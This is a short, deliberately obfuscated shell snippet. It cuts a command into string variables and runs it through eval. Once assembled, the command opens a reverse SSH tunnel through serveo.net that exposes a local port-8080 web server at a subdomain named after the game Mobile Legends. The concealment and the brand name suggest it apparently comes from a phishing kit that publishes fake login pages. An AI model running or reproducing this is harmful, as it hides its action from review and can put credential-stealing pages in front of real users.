z="
";Az='ssh ';Jz='ocal';Gz='veo.';Lz=':808';Hz='net:';Nz='rveo';Dz='eleg';Ez='ends';Kz='host';Mz='0 se';Cz='obil';Iz='80:l';Fz='.ser';Oz='.net';Bz='-R m';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz"